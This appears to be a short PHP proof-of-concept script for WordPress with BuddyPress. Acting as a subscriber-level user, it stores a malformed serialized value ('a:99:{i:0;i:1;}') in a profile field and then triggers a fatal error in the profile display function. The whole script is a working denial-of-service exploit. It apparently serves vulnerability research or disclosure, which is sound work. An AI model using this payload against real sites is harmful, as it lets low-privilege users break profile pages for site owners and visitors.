<?php
error_reporting(E_ERROR|E_PARSE);
function out($k,$v){ echo $k.': '.$v."\n"; }
$sub = get_user_by('login','subscriber'); wp_set_current_user($sub->ID);
$gid = xprofile_insert_field_group(array('name'=>'DoS Test'));
$fid = xprofile_insert_field(array('field_group_id'=>$gid,'name'=>'dostest','type'=>'textbox','can_delete'=>true));
// Quote-free payload: is_serialized() TRUE, unserialize() FALSE (count mismatch).
$payload = 'a:99:{i:0;i:1;}';
out('acting_as', $sub->user_login);
// Faithful: HTTP POST data arrives slashed.
xprofile_set_field_data($fid, $sub->ID, wp_slash($payload));
$stored = BP_XProfile_ProfileData::get_value_byid($fid, $sub->ID);
out('stored_value', var_export($stored,true));
out('is_serialized', is_serialized($stored)?'TRUE':'false');
out('unserialize_result', var_export(@unserialize($stored),true));
// Now the display path used to render profile fields.
try {
  $r = bp_unserialize_profile_field($stored);
  out('display_result', var_export($r,true));
} catch (\Throwable $e) {
  out('DISPLAY_FATAL', '*** '.get_class($e).': '.$e->getMessage().' ***');
}
